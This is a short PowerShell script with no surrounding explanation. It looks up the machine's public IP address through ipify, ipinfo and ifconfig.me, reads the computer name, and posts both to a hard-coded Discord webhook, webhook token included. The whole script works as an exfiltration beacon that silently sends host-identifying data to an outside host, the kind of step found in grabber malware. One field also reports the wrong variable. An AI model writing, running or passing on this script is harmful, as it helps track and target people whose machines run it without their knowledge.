$url = "https://discord.com/api/webhooks/1060451832108949596/-doca_q-YfvU_TZ1feEwZ3QuatUBCPnaQx1UW95kVkQ3_7QpmiidEzXoceBJ6oHr-KCZ";
$AddressUsingIpify = (Invoke-WebRequest -uri "https://api.ipify.org/").Content;
$AddressUsingIpInfo = Invoke-WebRequest -uri "https://ipinfo.io/ip";
$AddressUsingIfconfig = Invoke-WebRequest -uri "https://ifconfig.me/ip";
$Body=@{ content = "Computer Name:\n```$env:computername```\nIPv4 Address Using Ipify API:\n```$AddressUsingIpify```\nIPv4 Address Using IPInfo API:\n```$AddressUsingIpify```\nIPv4 Address Using Ifconfig API:\n```$AddressUsingIfconfig```"};
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
exit
